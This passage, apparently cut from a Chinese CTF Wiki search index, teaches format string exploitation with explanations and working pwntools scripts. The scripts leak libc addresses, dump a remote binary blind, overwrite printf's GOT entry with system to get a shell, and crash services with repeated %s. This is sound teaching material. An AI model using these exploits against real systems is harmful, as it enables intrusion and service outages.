\u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684ebp\u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002","title":"\u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740"},{"location":"pwn/fmtstr/fmtstr_example/#ebp","text":"\u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884cmove\u6307\u4ee4\u5c06ebp\u8d4b\u7ed9esp\uff0c\u5e76\u8fd8\u9700\u8981\u6267\u884cpop ebp\u624d\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06ebp\u4fee\u6539\u4e3a\u5b58\u50a8system\u5730\u5740-4\u7684\u503c\u3002\u8fd9\u6837pop ebp\u4e4b\u540e\uff0cesp\u6070\u597d\u6307\u5411\u4fdd\u5b58system\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884cret\u6307\u4ee4\u5373\u53ef\u6267\u884csystem\u51fd\u6570\u3002 \u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684ebp\u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a11\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684payload\u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002 part1 = (heap_addr - 4) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'","title":"\u4fee\u6539ebp"},{"location":"pwn/fmtstr/fmtstr_example/#shell","text":"\u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u51655\uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6shell\u3002","title":"\u83b7\u53d6shell"},{"location":"pwn/fmtstr/fmtstr_example/#_30","text":"from pwn import * from LibcSearcher import * contact = ELF ( './contacts' ) ##context.log_level = 'debug' if args [ 'REMOTE' ]: sh = remote ( 11 , 111 ) else : sh = process ( './contacts' ) def createcontact ( name , phone , descrip_len , description ): sh . recvuntil ( '>>> ' ) sh . sendline ( '1' ) sh . recvuntil ( 'Contact info: \\n ' ) sh . recvuntil ( 'Name: ' ) sh . sendline ( name ) sh . recvuntil ( 'You have 10 numbers \\n ' ) sh . sendline ( phone ) sh . recvuntil ( 'Length of description: ' ) sh . sendline ( descrip_len ) sh . recvuntil ( 'description: \\n\\t\\t ' ) sh . sendline ( description ) def printcontact (): sh . recvuntil ( '>>> ' ) sh . sendline ( '4' ) sh . recvuntil ( 'Contacts:' ) sh . recvuntil ( 'Description: ' ) ## get system addr & binsh_addr payload = '%31$paaaa' createcontact ( '1111' , '1111' , '111' , payload ) printcontact () libc_start_main_ret = int ( sh . recvuntil ( 'aaaa' , drop = True ), 16 ) log . success ( 'get libc_start_main_ret addr: ' + hex ( libc_start_main_ret )) libc = LibcSearcher ( '__libc_start_main_ret' , libc_start_main_ret ) libc_base = libc_start_main_ret - libc . dump ( '__libc_start_main_ret' ) system_addr = libc_base + libc . dump ( 'system' ) binsh_addr = libc_base + libc . dump ( 'str_bin_sh' ) log . success ( 'get system addr: ' + hex ( system_addr )) log . success ( 'get binsh addr: ' + hex ( binsh_addr )) ##gdb.attach(sh) ## get heap addr and ebp addr payload = flat ([ system_addr , 'bbbb' , binsh_addr , '%6$p%11$pcccc' , ]) createcontact ( '2222' , '2222' , '222' , payload ) printcontact () sh . recvuntil ( 'Description: ' ) data = sh . recvuntil ( 'cccc' , drop = True ) data = data . split ( '0x' ) print data ebp_addr = int ( data [ 1 ], 16 ) heap_addr = int ( data [ 2 ], 16 ) ## modify ebp part1 = ( heap_addr - 4 ) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str ( part1 ) + 'x%' + str ( part2 ) + 'x%6$n' ##print payload createcontact ( '3333' , '123456789' , '300' , payload ) printcontact () sh . recvuntil ( 'Description: ' ) sh . recvuntil ( 'Description: ' ) ##gdb.attach(sh) print 'get shell' sh . recvuntil ( '>>> ' ) ##get shell sh . sendline ( '5' ) sh . interactive () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"pwn/fmtstr/fmtstr_example/#_31","text":"","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"pwn/fmtstr/fmtstr_example/#_32","text":"\u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684ip\u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684binary\u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884cpwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548cBROP\u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7BROP\u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002","title":"\u539f\u7406"},{"location":"pwn/fmtstr/fmtstr_example/#1-","text":"\u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939fmt_blind_stack\u4e2d\u3002","title":"\u4f8b\u5b501-\u6cc4\u9732\u6808"},{"location":"pwn/fmtstr/fmtstr_example/#_33","text":"\u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86%p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f \u279c blind_fmt_stack git: ( master ) \u2717 nc localhost 9999 %p 0x7ffd4799beb0 G\ufffdflag is on the stack% \u544a\u8bc9\u6211\u4eecflag\u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"},{"location":"pwn/fmtstr/fmtstr_example/#_34","text":"\u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b from pwn import * context . log_level = 'error' def leak ( payload ): sh = remote ( '127.0.0.1' , 9999 ) sh . sendline ( payload ) data = sh . recvuntil ( ' \\n ' , drop = True ) if data . startswith ( '0x' ): print p64 ( int ( data , 16 )) sh . close () i = 1 while 1 : payload = '%{}$p' . format ( i ) leak ( payload ) i += 1 \u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230flag //////// //////// \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x ff flag { thi s_is_fla g } \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x fe \\x 7f \\x 00 \\x 00","title":"\u5229\u7528"},{"location":"pwn/fmtstr/fmtstr_example/#2-got","text":"\u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728blind_fmt_got\u6587\u4ef6\u5939\u4e2d\u3002","title":"\u4f8b\u5b502-\u76f2\u6253\u52ab\u6301got"},{"location":"pwn/fmtstr/fmtstr_example/#_35","text":"\u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a64\u4f4d\u3002 \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 %p 0x7fff3b9774c0 \u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"},{"location":"pwn/fmtstr/fmtstr_example/#_36","text":"\u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 aaaaaaaa%p%p%p%p%p%p%p%p%p aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025 \u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a6\u3002","title":"\u786e\u5b9a\u504f\u79fb"},{"location":"pwn/fmtstr/fmtstr_example/#binary","text":"\u7531\u4e8e\u7a0b\u5e8f\u662f64\u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece0x400000\u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165'\\x00'\u5b57\u7b26\u7684\uff0c\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f'\\x00'\u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f'\\x00'\u622a\u65ad\u7684\u3002\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002 ##coding=utf8 from pwn import * ##context.log_level = 'debug' ip = \"127.0.0.1\" port = 9999 def leak ( addr ): # leak addr for three times num = 0 while num < 3 : try : print 'leak addr: ' + hex ( addr ) sh = remote ( ip , port ) payload = '%00008$s' + 'STARTEND' + p64 ( addr ) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if ' \\x0a ' in payload : return None sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) sh . close () return data except Exception : num += 1 continue return None def getbinary (): addr = 0x400000 f = open ( 'binary' , 'w' ) while addr < 0x401000 : data = leak ( addr ) if data is None : f . write ( ' \\xff ' ) addr += 1 elif len ( data ) == 0 : f . write ( ' \\x00 ' ) addr += 1 else : f . write ( data ) addr += len ( data ) f . close () getbinary () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728payload\u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709'\\n'\u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002","title":"\u6cc4\u9732binary"},{"location":"pwn/fmtstr/fmtstr_example/#binary_1","text":"\u5229\u7528ida\u6253\u5f00\u6cc4\u9732\u7684binary\uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8fmain\u51fd\u6570\u7684\u5730\u5740 seg000: 00000000004005 F6 push rbp seg000: 00000000004005 F7 mov rbp , rsp seg000: 00000000004005 FA add rsp , 0 FFFFFFFFFFFFFF80h seg000: 00000000004005 FE seg000: 00000000004005 FE loc_4005FE : ; CODE XREF: seg000:0000000000400639\u0019j seg000 : 00000000004005 FE lea rax , [ rbp-80h ] seg000: 0000000000400602 mov edx , 80 h ; '\u20ac' seg000 : 0000000000400607 mov rsi , rax seg000: 000000000040060 A mov edi , 0 seg000: 000000000040060 F mov eax , 0 seg000: 0000000000400614 call sub_4004C0 seg000: 0000000000400619 lea rax , [ rbp-80h ] seg000: 000000000040061 D mov rdi , rax seg000: 0000000000400620 mov eax , 0 seg000: 0000000000400625 call sub_4004B0 seg000: 000000000040062 A mov rax , cs : 601048 h seg000: 0000000000400631 mov rdi , rax seg000: 0000000000400634 call near ptr unk_4004E0 seg000: 0000000000400639 jmp short loc_4005FE \u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662fsub_4004C0\u4e3aread\u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662fread\u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684sub_4004B0\u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2awhile 1\u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002","title":"\u5206\u6790binary"},{"location":"pwn/fmtstr/fmtstr_example/#_37","text":"\u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def \u6cc4\u9732printf\u51fd\u6570\u7684\u5730\u5740\uff0c \u83b7\u53d6\u5bf9\u5e94libc\u4ee5\u53casystem\u51fd\u6570\u5730\u5740 \u4fee\u6539printf\u5730\u5740\u4e3asystem\u51fd\u6570\u5730\u5740 \u8bfb\u5165/bin/sh;\u4ee5\u4fbf\u4e8e\u83b7\u53d6shell","title":"\u5229\u7528\u601d\u8def"},{"location":"pwn/fmtstr/fmtstr_example/#_38","text":"\u7a0b\u5e8f\u5982\u4e0b\u3002 ##coding=utf8 import math from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' context . arch = 'amd64' ip = \"127.0.0.1\" port = 9999 def leak ( addr ): # leak addr for three times num = 0 while num < 3 : try : print 'leak addr: ' + hex ( addr ) sh = remote ( ip , port ) payload = '%00008$s' + 'STARTEND' + p64 ( addr ) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if ' \\x0a ' in payload : return None sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) sh . close () return data except Exception : num += 1 continue return None def getbinary (): addr = 0x400000 f = open ( 'binary' , 'w' ) while addr < 0x401000 : data = leak ( addr ) if data is None : f . write ( ' \\xff ' ) addr += 1 elif len ( data ) == 0 : f . write ( ' \\x00 ' ) addr += 1 else : f . write ( data ) addr += len ( data ) f . close () ##getbinary() read_got = 0x601020 printf_got = 0x601018 sh = remote ( ip , port ) ## let the read get resolved sh . sendline ( 'a' ) sh . recv () ## get printf addr payload = '%00008$s' + 'STARTEND' + p64 ( read_got ) sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) . ljust ( 8 , ' \\x00 ' ) sh . recv () read_addr = u64 ( data ) ## get system addr libc = LibcSearcher ( 'read' , read_addr ) libc_base = read_addr - libc . dump ( 'read' ) system_addr = libc_base + libc . dump ( 'system' ) log . success ( 'system addr: ' + hex ( system_addr )) log . success ( 'read addr: ' + hex ( read_addr )) ## modify printf_got payload = fmtstr_payload ( 6 , { printf_got : system_addr }, 0 , write_size = 'short' ) ## get all the addr addr = payload [: 32 ] payload = ' %32d ' + payload [ 32 :] offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) for i in range ( 6 , 10 ): old = '%{}$' . format ( i ) new = '%{}$' . format ( offset + i ) payload = payload . replace ( old , new ) remainer = len ( payload ) % 8 payload += ( 8 - remainer ) * 'a' payload += addr sh . sendline ( payload ) sh . recv () ## get shell sh . sendline ( '/bin/sh;' ) sh . interactive () \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801 ## modify printf_got payload = fmtstr_payload ( 6 , { printf_got : system_addr }, 0 , write_size = 'short' ) ## get all the addr addr = payload [: 32 ] payload = ' %32d ' + payload [ 32 :] offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) for i in range ( 6 , 10 ): old = '%{}$' . format ( i ) new = '%{}$' . format ( offset + i ) payload = payload . replace ( old , new ) remainer = len ( payload ) % 8 payload += ( 8 - remainer ) * 'a' payload += addr sh . sendline ( payload ) sh . recv () fmtstr_payload\u76f4\u63a5\u5f97\u5230\u7684payload\u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4printf\u7684\u65f6\u5019'\\x00'\u622a\u65ad\uff08 \u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools\u76ee\u524d\u6b63\u5728\u5f00\u53d1fmt_payload\u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002 \uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u97628\u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9payload\u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) \u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e'%order$hn'\u4e2dorder\u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"pwn/fmtstr/fmtstr_exploit/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528 \u00b6 \u5176\u5b9e\uff0c\u5728\u4e0a\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u5c55\u793a\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u4e24\u4e2a\u5229\u7528\u624b\u6bb5 \u4f7f\u7a0b\u5e8f\u5d29\u6e83\uff0c\u56e0\u4e3a%s\u5bf9\u5e94\u7684\u53c2\u6570\u5730\u5740\u4e0d\u5408\u6cd5\u7684\u6982\u7387\u6bd4\u8f83\u5927\u3002 \u67e5\u770b\u8fdb\u7a0b\u5185\u5bb9\uff0c\u6839\u636e%d\uff0c%f\u8f93\u51fa\u4e86\u6808\u4e0a\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u6211\u4eec\u4f1a\u5bf9\u4e8e\u6bcf\u4e00\u65b9\u9762\u8fdb\u884c\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u91ca\u3002 \u7a0b\u5e8f\u5d29\u6e83 \u00b6 \u901a\u5e38\u6765\u8bf4\uff0c\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u662f\u6700\u4e3a\u7b80\u5355\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165\u82e5\u5e72\u4e2a%s\u5373\u53ef %s%s%s%s%s%s%s%s%s%s%s%s%s%s \u8fd9\u662f\u56e0\u4e3a\u6808\u4e0a\u4e0d\u53ef\u80fd\u6bcf\u4e2a\u503c\u90fd\u5bf9\u5e94\u4e86\u5408\u6cd5\u7684\u5730\u5740\uff0c\u6240\u4ee5\u603b\u662f\u4f1a\u6709\u67d0\u4e2a\u5730\u5740\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u3002\u8fd9\u4e00\u5229\u7528\uff0c\u867d\u7136\u653b\u51fb\u8005\u672c\u8eab\u4f3c\u4e4e\u5e76\u4e0d\u80fd\u63a7\u5236\u7a0b\u5e8f\uff0c\u4f46\u662f\u8fd9\u6837\u5374\u53ef\u4ee5\u9020\u6210\u7a0b\u5e8f\u4e0d\u53ef\u7528\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u8fdc\u7a0b\u670d\u52a1\u6709\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u5176\u53ef\u7528\u6027\uff0c\u4f7f\u670d\u52a1\u5d29\u6e83\uff0c\u8fdb\u800c\u4f7f\u5f97\u7528\u6237\u4e0d\u80fd\u591f\u8bbf\u95ee\u3002 \u6cc4\u9732\u5185\u5b58 \u00b6 \u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c \u6cc4\u9732\u6808\u5185\u5b58 \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58 \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u5229\u7528GOT\u8868\u5f97\u5230libc\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83libc\u51fd\u6570\u5730\u5740 \u76f2\u6253\uff0cdump\u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002 \u6cc4\u9732\u6808\u5185\u5b58 \u00b6 \u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f #include <stdio.h> int main () { char s [ 100 ]; int a = 1 , b = 0x22222222 , c = - 1 ; scanf ( \"%s\" , s ); printf ( \"%08x.%08x.%08x.%s \\n \" , a , b , c , s ); printf ( s ); return 0 ; } \u7136\u540e\uff0c\u6211\u4eec\u7b80\u5355\u7f16\u8bd1\u4e00\u4e0b \u279c leakmemory git: ( master ) \u2717 make gcc -fno-stack-protector -no-pie -o leakmemory leakmemory.c leakmemory.c: In function \u2018main\u2019: leakmemory.c:7:10: warning: format not a string literal and no format arguments [ -Wformat-security ] printf ( s ) ; ^ \u53ef\u4ee5\u770b\u51fa\uff0c\u7f16\u8bd1\u5668\u6307\u51fa\u4e86\u6211\u4eec\u7684\u7a0b\u5e8f\u4e2d\u6ca1\u6709\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u53c2\u6570\u7684\u95ee\u9898\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\uff0c\u5982\u4f55\u83b7\u53d6\u5bf9\u5e94\u7684\u6808\u5185\u5b58\u3002 \u6839\u636eC\u8bed\u8a00\u7684\u8c03\u7528\u89c4\u5219\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4f1a\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f4\u63a5\u4f7f\u7528\u6808\u4e0a\u81ea\u9876\u5411\u4e0a\u7684\u53d8\u91cf\u4f5c\u4e3a\u5176\u53c2\u6570(64\u4f4d\u4f1a\u6839\u636e\u5176\u4f20\u53c2\u7684\u89c4\u5219\u8fdb\u884c\u83b7\u53d6)\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd32\u4f4d\u3002 \u83b7\u53d6\u6808\u53d8\u91cf\u6570\u503c \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u83b7\u53d6\u6808\u4e0a\u53d8\u91cf\u7684\u6570\u503c\u3002\u6211\u4eec\u53ef\u4ee5\u8bd5\u4e00\u4e0b\uff0c\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u279c leakmemory git: ( master ) \u2717 ./leakmemory %08x.%08x.%08x 00000001 .22222222.ffffffff.%08x.%08x.%08x ffcfc400.000000c2.f765a6bb \u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86\u4e00\u4e9b\u5185\u5bb9\u3002\u4e3a\u4e86\u66f4\u52a0\u7ec6\u81f4\u7684\u89c2\u5bdf\uff0c\u6211\u4eec\u5229\u7528GDB\u6765\u8c03\u8bd5\u4e00\u4e0b\uff0c\u4ee5\u4fbf\u4e8e\u9a8c\u8bc1\u6211\u4eec\u7684\u60f3\u6cd5\uff0c\u8fd9\u91cc\u5220\u9664\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u53ea\u5173\u6ce8\u4ee3\u7801\u6bb5\u4ee5\u53ca\u6808\u3002 \u9996\u5148\uff0c\u542f\u52a8\u7a0b\u5e8f\uff0c\u5c06\u65ad\u70b9\u4e0b\u8f7dprintf\u51fd\u6570\u5904 \u279c leakmemory git: ( master ) \u2717 gdb leakmemory gef\u27a4 b printf Breakpoint 1 at 0x8048330 \u4e4b\u540e\uff0c\u8fd0\u884c\u7a0b\u5e8f gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory %08x.%08x.%08x 